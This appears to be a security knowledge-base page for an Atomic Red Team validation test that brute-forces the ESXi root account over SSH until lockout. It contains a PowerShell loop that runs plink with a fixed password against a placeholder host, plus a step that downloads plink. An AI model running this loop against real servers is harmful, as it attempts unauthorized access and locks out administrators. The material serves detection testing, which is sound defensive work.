---
atomic_guid: "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5"
title: "ESXi - Brute Force Until Account Lockout"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.001"
attack_technique_name: "Brute Force: Password Guessing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5"
  - "ESXi - Brute Force Until Account Lockout"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ESXi - Brute Force Until Account Lockout

An adversary may attempt to brute force the password of privilleged account for privilege escalation.
In the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)

## Metadata

- Atomic GUID: ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5
- Technique: T1110.001: Brute Force: Password Guessing
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.001/T1110.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.001]]

## Input Arguments

### lockout_threshold

- description: Specify the account lockout threshold configured on the ESXI management server
- type: string
- default: 5

### plink_file

- description: Path to Putty
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

### vm_host

- description: Specify the host name of the ESXi Server
- type: string
- default: atomic.local

## Dependencies

The plink executable must be found in the ExternalPayloads folder.

### Prerequisite Check

```powershell
if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$lockout_threshold = [int]"#{lockout_threshold}"
for ($var = 1; $var -le $lockout_threshold; $var++) {
  #{plink_file} -ssh "#{vm_host}" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
  }
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml)
